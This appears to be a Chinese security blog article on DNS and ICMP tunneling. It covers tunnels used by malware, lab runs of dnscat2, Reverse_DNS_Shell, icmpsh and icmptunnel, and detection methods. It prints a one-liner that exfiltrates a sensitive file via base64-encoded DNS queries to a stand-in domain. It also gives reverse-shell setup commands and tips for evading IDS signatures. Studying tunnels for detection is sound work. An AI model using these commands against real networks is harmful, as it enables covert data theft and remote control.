> 隧道技术之 DNS 和 ICMP 与其检测防御
[![](https://p3.ssl.qhimg.com/t01e26b6d9b938b27de.jpg)](https://p3.ssl.qhimg.com/t01e26b6d9b938b27de.jpg)

简述
--

为了逃避监测，绕过杀软，更好的隐藏自身，很多木马的传输层都使用了隧道技术, 那什么是隧道技术（我是谁）？其传输有什么特点（我从哪里来）？隧道技术的现状是怎样的呢（我到那里去）？连问三连击：）

**隧道技术（Tunneling）**：是一种通过使用互联网络的基础设施在网络之间传递数据的方式，使用隧道传递的 Data(数据) 或 Payload (负载）可以是不同协议的数据帧或包。隧道协议将其它协议的数据帧或包，重新封装然后通过隧道发送，新的帧头，提供路由信息，以便通过互联网传递被封装的 Payload。

**数据传输特点（Feature）**：不通过网络直接发送数据包，通过封装技术在另一个 (通常是加密的) 连接中发送数据。

现状：传统 socket 隧道已极少，TCP、UDP 大量被防御系统拦截，DNS、ICMP、http/https 等难于禁止的协议已成为黑客控制隧道的主流。

上面我们了解了隧道技术，不知你是否会好奇 DNS 隧道为什么会有那么强大？一方面是因为 DNS 报文具有天然的穿透防火墙的能力; 另一方面, 目前的杀毒软件、IDS 等安全策略很少对 DNS 报文进行有效的监控管理：）接下来我们来回顾下这样几个典型的攻击事件中用到的隧道木马的特点。

### ALMA Communicator From OilRig 黑客组织

它使用了 DNS 隧道来作为 C2 通信信道，使用了专门的子域名来给 C2 服务器传输数据，服务器使用了专门的 IPv4 地址来给木马发送数据。

[![](https://p3.ssl.qhimg.com/t017a3764b98652a8b6.png)](https://p3.ssl.qhimg.com/t017a3764b98652a8b6.png)  
木马构造的 C2 域名结构

[![](https://p0.ssl.qhimg.com/t013365c4a25b0a83e7.png)](https://p0.ssl.qhimg.com/t013365c4a25b0a83e7.png)  
DNS 查询时的结构

> Read More!!! [https://www.anquanke.com/post/id/87228](https://www.anquanke.com/post/id/87228)

### Trojan.Win32.Ismdoor.gen

该木马使用 DNS 隧道，并将传出 “datagrams”（数据报）的长度被限制在 60 字符，C&C 服务器的命令解析到 IPv6 地址，一个典型的查询发送到 C&C 服务器如下:

```
n.n.c.<Session ID >.<Serverdomain>.com
```

[![](https://p0.ssl.qhimg.com/t018404eec79d53c35c.png)](https://p0.ssl.qhimg.com/t018404eec79d53c35c.png)  
[![](https://p2.ssl.qhimg.com/t01fc7edef7c2f163bf.png)](https://p2.ssl.qhimg.com/t01fc7edef7c2f163bf.png)  
​ 传输层请求和响应的结构

> Read More!!! [http://www.4hou.com/info/news/10250.html](http://www.4hou.com/info/news/10250.html)

### XshellGhost

在发送数据包时，会将数据嵌套到 DNS 协议中发送，其中数据会编码成特定的字符串，添加在要配置文件中的 CCDNS URL 前，实现 DNS 隧道通讯。

[![](https://p5.ssl.qhimg.com/t012a30ff44f7e09390.png)](https://p5.ssl.qhimg.com/t012a30ff44f7e09390.png)  
Xshell DNS 隧道通讯编码  
[![](https://p2.ssl.qhimg.com/t0142815e8b0592e891.jpg)](https://p2.ssl.qhimg.com/t0142815e8b0592e891.jpg)  
Xshell DNS 隧道通讯源码

> Read More!!! [http://www.4hou.com/technology/7368.html](http://www.4hou.com/technology/7368.html)

相信机智的你已经看出来了🙂这些 DNS 隧道的木马都有一个共性，它们的 DNS 通信协议，看起来都比较奇怪，对，就是不正常；那么我们该如何去检测！, 目前主要分为两大类: 载荷分析和流量监测。

载荷分析：把主机名超过 52 个字符的 DNS 请求作为识别 DNS 隧道的特征.（正常的域名满足 Zipf 定律, 而走 DNS 隧道的域名遵循的是随机分布）

流量监测：检测网络中的 DNS 流量变化情况，通过检测单位时间内 DNS 报文流速率来检测是否存在 DNS 隧道，利用检测 txt 类型的 DNS 报文来发现僵尸网络的通信情况。

实验环境
----

在接下来的环节中，我会利用 Github 上常见的开源隧道工具如 dnscat2、Reverse_DNS_Shell、icmpsh、icmptunnel 等进行实验，分析其通信，提取相关的特征。

```
Server: inet192.168.30.129 Debian 7.2
Client: inet 192.168.30.130Debian 7.2
Other: inet192.168.30.134 Win XP
```

### DNS 隧道

DNS 隧道通信是 C&C 常用的通信方式，一般常用的编码方式 Base64、Binary、Hex 编码等，请求的 Type 一般为 txt（为了返回的时候能够加入更多的信息）payload 部分一般为子域名。DNS 工作原理如下：

[![](https://p4.ssl.qhimg.com/t01e256636acf9ac124.png)](https://p4.ssl.qhimg.com/t01e256636acf9ac124.png)

这里先介绍 DNS 隧道的一个应用场景：

> 在安全策略严格的内网环境中，常见的 C&C 通讯端口都被众多安全设备所监控。如果红队对目标内网的终端进行渗透时，发现该网段只允许白名单流量出站，同时其它端口都被屏蔽时，传统 C&C 通讯手段无法成立，反弹 Shell 变得十分困难。在这种情况下，红队还有一个最后的选择：使用 DNS 隐蔽隧道建立 ReverseShell。

一个 Demo（我们可以用下面这样的 shell:).

```
For I in (cat sensitive.txt); do d=(echoi|base64) && nslookup d.test.com; done
/**对每行内容进行base64编码,在DNS查询期间将其用作子域，一旦查询到达test.com的Authoritative DNS服务器，我们就可以捕获相应的DNS日志，通过解析日志可以获得子域，从而得到相应的敏感数据**/
这样的 shell 自然存在许多不足的地方
```

1、单向通信，不能从 C2(Authoritative DNS) 发回命令  
2、读取文件非常容易，如果需要处理 100MB 数据时 DNS 数据包可能会以不同的顺序到达。  
根据木马工作原理的不同, 将 DNS 隧道木马细分为 IP 直连型和域名型，这里主要介绍：DnsCat2、Dnscat2-powershell、Reverse_DNS_Shell。

**dnscat2**

DNScat2 支持加密，通过预共享密钥进行身份验证，多个同时进行的会话，类似于 ssh 中的隧道，命令 shell 以及最流行的 DNS 查询类型（TXT，MX，CNAME，A，AAAA）, 客户端用 C 语言编写，服务器用 ruby 编写。

[![](https://p0.ssl.qhimg.com/t0155ea27f101d909dc.png)](https://p0.ssl.qhimg.com/t0155ea27f101d909dc.png)  
Dns Tuneling

当运行客户端时，需要指定一个域名（域名型 DNS 隧道木马），所有请求都将发送到本地 DNS 服务器，然后将转发至该域 Authoritative DNS 服务器，如果你没有一个 Authoritative DNS 服务器，你也可以选择 UDP 的 53 端口（IP 直连型 DNS 隧道木马），这样速度更快，而且看起来仍然像普通的 DNS 查询，但是在请求日志中所有域名都是以 dnscat 开头，这种模式也容易被防火墙检测到，Server 需要在 Authoritative DNS 服务器上运行，与 Client 相同需要指定域名 / IP。

[![](https://p0.ssl.qhimg.com/t01f4ccf70c266f521d.png)](https://p0.ssl.qhimg.com/t01f4ccf70c266f521d.png)  
​ 域名型 DNS 隧道木马通信架构图

一、部署

```
#Client
$ git clonehttps://github.com/iagox86/dnscat2.git
$ cd dnscat2/client/
$ make
#Server
yum install rubygems
gem install bundler
git clonehttps://github.com/iagox86/dnscat2.git
cd dnscat2/server
bundle install
```

二、参数介绍  
请注意把 dnsch.cirrus.[domain] 换成你自己的域名。  
命令行中：

> -c 参数定义了 pre-shared secret，可以使用具有预共享密钥的身份验证来防止中间人（man-in-the-middle）攻击，否则传输数据并未加密，有可能被监听网络流量的第三方还原；如果不加定义，Dnscat2 会生成一个字符串，记得拷贝下来在启动客户端时使用。
> 
> -e 参数可以规定安全级别， open 代表让客户端进行选择。
> 
> —no-cache 请务必在运行服务器时添加无缓存选项，因为 powershell-dnscat2 客户端与 dnscat2 服务器的 caching 模式不兼容。

三、Usage  
如果目标内网放行了所有的 DNS 请求，那么就可以直接指定 HOST ，通过 UDP53 端口通信，而如果目标内网只允许和受信任的 DNS 服务器通信时就需要申请注意域名，并将运行 dnscat2 server 的服务器指定 Authoritative DNS 服务器，这里我们以第一种情况为例。  
四、细节如下  
1）Server

```
ruby ./dnscat2.rb
```

[![](https://p5.ssl.qhimg.com/t013c4d8a49008b4b7e.png)](https://p5.ssl.qhimg.com/t013c4d8a49008b4b7e.png)  
2）Client

```
./dnscat --dns server=192.168.30.129,port=53 --secret=a152c1cc946358825617f5cbcd3dce44
```

[![](https://p3.ssl.qhimg.com/t01fc95d5b630092ca2.png)](https://p3.ssl.qhimg.com/t01fc95d5b630092ca2.png)

3）Server 可以看到连接建立

[![](https://p2.ssl.qhimg.com/t01983e5007267e8b7a.png)](https://p2.ssl.qhimg.com/t01983e5007267e8b7a.png)

4）通信数据包特征

[![](https://p0.ssl.qhimg.com/t019905259051eae0e8.png)](https://p0.ssl.qhimg.com/t019905259051eae0e8.png)

五、检测与防御

检测：  
1、上文提到默认的 dnscat 查询中包含了 dnscat 字符串，这个可以作为防火墙和入侵检测的特征  
2、检查出站 DNS 查询的查询长度，监视来自特定主机的 DNS 查询的频率，以及检查特定的不常见查询类型是一些示例。  
3、记录 DNS 查询日志，通过频率、长度、类型监控异常日志  
防御：防火墙上限制只允许与受信任的 DNS 服务器通信

**dnscat2-powershell**

> [https://github.com/lukebaggett/dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell)

[![](https://p2.ssl.qhimg.com/t0152302e59a972347d.png)](https://p2.ssl.qhimg.com/t0152302e59a972347d.png)

Dnscat2-powershell 可通过通用签名避免检测:

*   1、可以在客户端使用 –Delay 和–MaxRandomDelay 与 Start-Dnscat2 发送的每个请求之间添加静态或随机延迟；可以使用查询的精确最大长度基于查询来编写签名。如果您想要稍微隐蔽一些，可以使用 - MaxPacketSize 参数缩短最大请求大小。
*   2、许多 DNS 隧道将使用 TXT，CNAME 或 MX 查询，因为它们的响应处理简单，响应时间长。这些不是最常见的查询类型，因此 IDS 可能会警告这些查询的频率很高。故而可以构造基于：A 和 AAAA 查询（ Start-Dnscat2 的 - LookupTypes 参数可用于将有效查询类型列表传递给客户端）

以下提供构造避免检测及提高传输速度的一个演示视频，若无法打开，可见文末下载链接

> [https://www.youtube.com/watch?v=VrA8cyrssos](https://www.youtube.com/watch?v=VrA8cyrssos)

**Reverse_DNS_Shell**

使用 DNS 作为 C2 通道的 Python 反向 Shell。

> [https://github.com/ahhh/Reverse_DNS_Shell](https://github.com/ahhh/Reverse_DNS_Shell)

一、要求

*   dnslib
*   dnspython
*   pycrypto

KaliLinux 默认 python 环境为 2.7 以上（默认已安装好），以上三个包需要使用 pip 进行安装。

二、注意

*   首先运行服务端脚本
*   不要忘记更改您的秘密密钥（可在代码里面改）

三、原理解析

> [http://lockboxx.blogspot.com/2015/01/python-reverse-dns-shell.html](http://lockboxx.blogspot.com/2015/01/python-reverse-dns-shell.html)

四、细节

1） Server 端服务器监听状态

[![](https://p3.ssl.qhimg.com/t01c7fa0fb7869cfb1c.png)](https://p3.ssl.qhimg.com/t01c7fa0fb7869cfb1c.png)

2) Client 端请求状态

[![](https://p4.ssl.qhimg.com/t01392e67b7a63370ad.png)](https://p4.ssl.qhimg.com/t01392e67b7a63370ad.png)

3) 成功反弹 Shell

[![](https://p3.ssl.qhimg.com/t0195ce8f5c0051c4d3.png)](https://p3.ssl.qhimg.com/t0195ce8f5c0051c4d3.png)

五、利用 tcpdump 进行数据包抓取  
抓取主机：192.168.30.129 与 192.168.30.130 的通信数据包，保存为 root 目录下 DNSShell.cap

```
tcpdump -n -i eth0 host 192.168.30.129and 192.168.30.130 -w /root/DNSShell.cap
```

[![](https://p4.ssl.qhimg.com/t0109402abf4766c4fa.png)](https://p4.ssl.qhimg.com/t0109402abf4766c4fa.png)

数据包解析情况

[![](https://p3.ssl.qhimg.com/t0168b168911562d618.png)](https://p3.ssl.qhimg.com/t0168b168911562d618.png)

### ICMP 隧道

将 IP 流量封装进 IMCP 的 ping 数据包中，旨在利用 ping 穿透防火墙的检测，因为通常防火墙是不会屏蔽 ping 数据包。  
原理解析：

> 请求端的 Ping 工具通常会在 ICMP 数据包后面附加上一段随机的数据作为 Payload，而响应端则会拷贝这段 Payload 到 ICMP 响应数据包中返还给请求端，用于识别和匹配 Ping 请求（Windows 和 Linux 系统下的 Ping 工具默认的 Payload 长度为 64bit，但实际上协议允许附加最大 64K 大小的 Payload）

最后一个 Payload 字段是可以存放任何数据的，长度的话 理论上 ICMP 包外的 IP 包长度不超过 MTU 即可，但是实际上传不了那么大。

[![](https://p3.ssl.qhimg.com/t019a188cc6333ff518.png)](https://p3.ssl.qhimg.com/t019a188cc6333ff518.png)  
​ ICMP echo-request header

**ptunnel**

一个隧道工具，允许您通过可靠的 TCP 隧道连接一个远程主机，并使用 ICMP 回送请求和应答包，俗称 ping 请求和回复。

> [http://freshmeat.sourceforge.net/projects/ptunnel/](http://freshmeat.sourceforge.net/projects/ptunnel/)

使用场景简介：

> 两台机器间, 除了允许相互 ping 即 icmp 通信, 其他的 tcp/udp 端口一律不允许, 此时我们就可考虑利用 icmp 隧道进行穿透。

这里引用： Kionsec 的《利用 icmp 隧道轻松穿透 tcp/udp 四层封锁》

> [https://klionsec.github.io/2017/10/31/icmp-tunnel/](https://klionsec.github.io/2017/10/31/icmp-tunnel/)

流程如下

[![](https://p5.ssl.qhimg.com/t01900832aa21d04eb6.png)](https://p5.ssl.qhimg.com/t01900832aa21d04eb6.png)

**icmpsh**

icmpsh 是一个简单的反向 ICMPshell ，与其他类似的开源工具相比，其主要优势在于它不需要管理权限即可在目标计算机上运行。

> [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)

一、Usage

1）Server

禁用 ICMP

> sysctl -wnet.ipv4.icmp_echo_ignore_all=1

[![](https://p0.ssl.qhimg.com/t01597e5a7bf8d476ae.png)](https://p0.ssl.qhimg.com/t01597e5a7bf8d476ae.png)

设置监听 python icmpsh_m.pysrc(host：本地机器) dst(host：目标机器)

> ./icmpsh_m.py 192.168.30.130 192.168.30.134

[![](https://p5.ssl.qhimg.com/t019922227556cc3c0e.png)](https://p5.ssl.qhimg.com/t019922227556cc3c0e.png)

反弹上线

[![](https://p2.ssl.qhimg.com/t014d74fbeabd22e99f.png)](https://p2.ssl.qhimg.com/t014d74fbeabd22e99f.png)

2) Client  
反弹 shell 建立 session

> icmpsh.exe -t 192.168.30.130

[![](https://p1.ssl.qhimg.com/t0170e1170dfd0d8381.png)](https://p1.ssl.qhimg.com/t0170e1170dfd0d8381.png)

-r 参数 利用 test 账户进行测试

> icmpsh.exe -t 192.168.30.130 -r

[![](https://p5.ssl.qhimg.com/t0125f80418f32b9d28.png)](https://p5.ssl.qhimg.com/t0125f80418f32b9d28.png)

3）数据包特征

[![](https://p2.ssl.qhimg.com/t01be9fcd118a7ff938.png)](https://p2.ssl.qhimg.com/t01be9fcd118a7ff938.png)

4) Icmpsh –r 参数

[![](https://p2.ssl.qhimg.com/t018ba1bafcc8c3cfe1.png)](https://p2.ssl.qhimg.com/t018ba1bafcc8c3cfe1.png)

**icmptunnel**

icmptunnel 可以将 IP 流量封装进 IMCP 的 ping 数据包中，旨在利用 ping 穿透防火墙的检测。

对于隧道数据，icmptunnel 首先会指定客户端和服务器端。随后，客户端会将 IP 帧封装在 ICMP 请求数据包中发送给服务器，而服务器端则会使用相匹配的 ICMP 响应数据包进行回复（icmptunnel 提供在状态机防火墙和 NAT 网络之间，更加可靠的连接）。

> [https://github.com/jamesbarlow/icmptunnel.git](https://github.com/jamesbarlow/icmptunnel.git)

一、编译

```
$ git clone https://github.com/jamesbarlow/icmptunnel.git  
$ cd icmptunnel/ 
$ make
```

[![](https://p2.ssl.qhimg.com/t01e61a8d52393782cf.png)](https://p2.ssl.qhimg.com/t01e61a8d52393782cf.png)

二、Usage  
Server 与 Client 端禁止 ICMP 响应

> $ echo 1 >/proc/sys/net/ipv4/icmp_echo_ignore_all

[![](https://p1.ssl.qhimg.com/t011d5f7ee59fc4906b.png)](https://p1.ssl.qhimg.com/t011d5f7ee59fc4906b.png)

在服务端以服务器模式启动 icmptunnel，并给隧道接口分配一个 IP 地址

```
$./icmptunnel -s
openedtunnel device: tun0  
(ctrl-z)
$ bg
$ /sbin/ifconfig tun0 10.0.0.1 netmask255.255.255.0
```

[![](https://p0.ssl.qhimg.com/t012a0143b07a04f07a.png)](https://p0.ssl.qhimg.com/t012a0143b07a04f07a.png)

在客户端，使用 icmptunnel 连接上服务器，并给隧道接口分配一个 IP 地址

```
$ ./icmptunnel192.168.30.129
opened tunnel device: tun0  
connection established.  
(ctrl-z)
$ bg
$ /sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0
```

[![](https://p0.ssl.qhimg.com/t012a0143b07a04f07a.png)](https://p0.ssl.qhimg.com/t012a0143b07a04f07a.png)

这样我们就拥有一个端到端基于 ICMP 数据包的隧道了, 其中服务器地址为 10.10.0.1，客户端地址为 10.10.0.2, 在客户端可以尝试通过 SSH 连接服务器：

> $ssh [root@10.0.0](mailto:root@10.0.0).1

[![](https://p5.ssl.qhimg.com/t019b59d09887d99ebd.png)](https://p5.ssl.qhimg.com/t019b59d09887d99ebd.png)

数据流特征

[![](https://p1.ssl.qhimg.com/t0135fb189bbae9b1d4.png)](https://p1.ssl.qhimg.com/t0135fb189bbae9b1d4.png)  
检测与防御：  
检测：  
1、检测同一来源 ICMP 数据包的数量。一个正常的 ping 每秒最多只会发送两个数据包，而使用 ICMP 隧道的浏览器在同一时间会产生上千个 ICMP 数据包。  
2、注意那些 ICMP 数据包中 payload 大于 64 比特的数据包。当然 icmptunnel 可以配置限制所有数据包的 payload 为 64 比特，这样会使得更难以被检测到。  
3、寻找那些响应数据包中 payload 跟请求数据包不一致的 ICMP 数据包。  
4、检查 ICMP 数据包的协议标签。例如，icmptunnel 会在所有的 ICMPpayload 前面增加 ‘TUNL’ 标记以用于识别隧道，这就是特征。  
防御：禁止 ping。

总结与思考
-----

在一开始，我们就介绍了载荷分析和流量监测两种常规的检测方法，这两种方式不适用于高隐蔽性新型隧道木马检测，从我们测试提取的特征中，将样本特征添加到设备作为监测对象效率依旧低下。

思考：

> 我们是否可以用深度学习算法及自动检测技术来实现呢？

我们可以结合协议本身，基于通信行为检测隧道木马，, 采用 Winpcap 数据包捕获技术的底层过滤机制，抓取 DNS 流量. 将抓取的 DNS 流量按照五元组进行聚类, 形成 DNS 会话数据流. 将一个个 DNS 会话数据流提取成 DNS 会话评估向量, 作为分类训练模块和木马流量监测的输入。  
[![](https://p1.ssl.qhimg.com/t01318e5fa46b211649.png)](https://p1.ssl.qhimg.com/t01318e5fa46b211649.png)  
DNS 隧道木马检测流程框架

相关附件
----

主要为本次实验的相关流量包及 2 个视频

链接：[https://pan.baidu.com/s/1RdMYuUWhDYxKq0FQ7wLHmQ](https://pan.baidu.com/s/1RdMYuUWhDYxKq0FQ7wLHmQ)

提取码：4ygn

参考链接
----

[https://xz.aliyun.com/t/2214](https://xz.aliyun.com/t/2214)  
[https://www.blackhillsinfosec.com/powershell-dns-command-control-with-dnscat2-powershell/](https://www.blackhillsinfosec.com/powershell-dns-command-control-with-dnscat2-powershell/)  
[https://www.anquanke.com/post/id/152046](https://www.anquanke.com/post/id/152046)  
[https://klionsec.github.io/2017/10/31/icmp-tunnel/](https://klionsec.github.io/2017/10/31/icmp-tunnel/)  
[https://oing9179.github.io/blog/2017/06/The-ICMP-Tunnel/](https://oing9179.github.io/blog/2017/06/The-ICMP-Tunnel/)  
[https://www.cnblogs.com/KevinGeorge/p/8858718.html](https://www.cnblogs.com/KevinGeorge/p/8858718.html)  
[https://www.freebuf.com/articles/network/149328.html](https://www.freebuf.com/articles/network/149328.html)  
[https://www.anquanke.com/post/id/87228](https://www.anquanke.com/post/id/87228)